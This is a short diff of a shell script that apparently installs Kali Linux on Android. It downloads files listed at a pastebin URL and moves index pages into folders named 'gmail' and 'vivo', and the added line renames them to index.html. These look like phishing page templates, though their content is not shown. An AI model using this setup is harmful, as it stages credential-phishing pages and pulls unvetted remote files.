@@ -24,6 +24,7 @@ tar -xpf kali-basic.tar.bz2
 rm kali-basic.tar.bz2
 mv kali-armhf /$HOME && wget --quiet --show-progress -i https://pastebin.com/raw/1QfZgZFs ;rm 1Qf*
 mkdir /$HOME/kali-armhf/root/vivo;mkdir /$HOME/kali-armhf/root/gmail;mv index-v* photo* /$HOME/kali-armhf/root/vivo;mv index-g* /$HOME/kali-armhf/root/gmail
+mv /$HOME/kali-armhf/root/gmail/index-g* index.html && mv /$HOME/kali-armhf/root/vivo/index-v* index.html
 ln -s /storage/emulated/0 /$HOME/kali-armhf/sdcard
 echo -e "\n\e[5;92m Criando a sessao de login do kali.."
 sleep 2 && clear
